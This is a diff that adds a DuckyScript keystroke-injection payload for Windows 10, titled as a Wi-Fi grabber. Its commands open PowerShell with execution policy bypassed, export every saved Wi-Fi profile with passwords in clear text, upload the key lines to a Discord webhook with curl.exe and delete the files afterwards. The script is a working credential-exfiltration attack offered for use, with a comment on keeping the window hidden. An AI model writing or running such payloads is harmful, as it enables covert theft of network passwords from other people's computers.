@@ -1,0 +1,22 @@
+
+REM Title: Wifi Grabber to Discord 2
+REM Author: @beigeworm
+REM Description: Uses Powershell to gather Wifi info and send it via Discord.
+REM Target: Windows 10
+
+REM *SETUP*
+REM replace YOUR_WEBHOOK_HERE with your discord webhook.
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window)
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -Exec Bypass
+ENTER
+DELAY 4000
+
+STRING cd $env:tmp;netsh wlan export profile key=clear;Select-String -Path Wi*.xml -Pattern 'keyMa*' > Wi-Fi;curl.exe -F "f=@Wi-Fi" "YOUR_WEBHOOK_HERE";rm "Wi-*"
+DELAY 500
+ENTER
